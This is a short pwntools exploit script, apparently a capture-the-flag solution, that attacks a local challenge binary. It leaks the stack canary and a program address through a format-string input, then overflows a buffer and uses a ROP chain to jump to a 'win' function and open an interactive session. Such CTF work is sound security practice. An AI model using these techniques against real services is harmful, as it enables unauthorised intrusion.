#!/usr/bin/env python

from pwn import *

context.log_level = "debug"
context(os="linux", arch="amd64")
context.terminal = ["tmux", "split-window", "-h"]
elf = ELF("./chal")
context.binary = elf

offset = 0x80 - 0x8

#p = process(elf.path)
p = remote("localhost", 1438)
#gdb.attach(
#    p,
#    """
#    break *(main+255)
#    continue
#    """,
#)

# Leak canary and program address
p.recv()
p.sendline(b"%45$p %51$p")

p.recvuntil(b"Welcome ")
leak = p.recvline().strip().split()
canary = int(leak[0][2:], 16)
log.info(f"{hex(canary)=}")
main = int(leak[1][2:], 16)
elf.address = main - elf.symbols["main"]
log.info(f"{hex(elf.address)=}")

payload = offset * b"a" + p64(canary) + 8 * b"a"
rop = ROP(elf)

ret = rop.find_gadget(["ret"])[0]
rop.win()
ropchain = rop.chain()
print(rop.dump())

p.sendline(payload + p64(ret) + ropchain)
p.interactive()
p.close()
